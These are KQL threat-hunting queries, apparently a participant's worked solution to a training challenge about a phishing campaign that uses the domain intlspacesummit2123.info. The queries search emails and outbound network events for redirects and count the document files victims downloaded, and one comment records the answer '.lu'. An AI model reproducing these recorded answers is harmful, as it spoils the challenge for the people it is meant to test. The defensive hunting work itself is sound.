SecurityAlerts
| where  description contains "Space" or description contains "Summit" // we have filename and Hostname

//Which top-level domain (TLD) used by the attacker suggests evidence of foreign interference?
//TLD suggests foreign interference (like .ru, .cn, .ir, etc.)
Email
| where sender contains "@intlspacesummit2123.info" 
| distinct 


OutboundNetworkEvents
| where url contains "intlspacesummit2123.info" and url contains "redirect"
| distinct url //27 IPs

// Response is .lu

//What was the most common file (name) that victims downloaded from the attacker domains in Q2?

OutboundNetworkEvents
| where url contains "intlspacesummit2123.info" and url contains "redirect" and url contains ".lu"
| distinct url

let domains =
OutboundNetworkEvents
  | where url contains "https://intlspacesummit2123.info?redirect=" and url contains ".lu"
  | parse url with "https://intlspacesummit2123.info?redirect=" extracted_path
  | distinct extracted_path;
OutboundNetworkEvents
  | where url has_any (domains)
  | where url !contains "https://intlspacesummit2123.info?redirect="
  | parse url with * "files/" filename
  | parse url with * "images/" filename1
  | parse url with * "modules/" filename2
  | parse url with * "online/" filename3
  | parse url with * "public/" filename4
  | parse url with * "published/" filename5
  | parse url with * "search/" filename6
  | parse url with * "share/" filename7
  | extend resultfilename = coalesce(filename, filename1, filename2, filename3, filename4, filename5, filename6, filename7)
  | where resultfilename has_any (".xlsx", ".ppt", ".pdf", ".xls", ".docx")
  | summarize Count = count() by resultfilename
  | order by Count desc
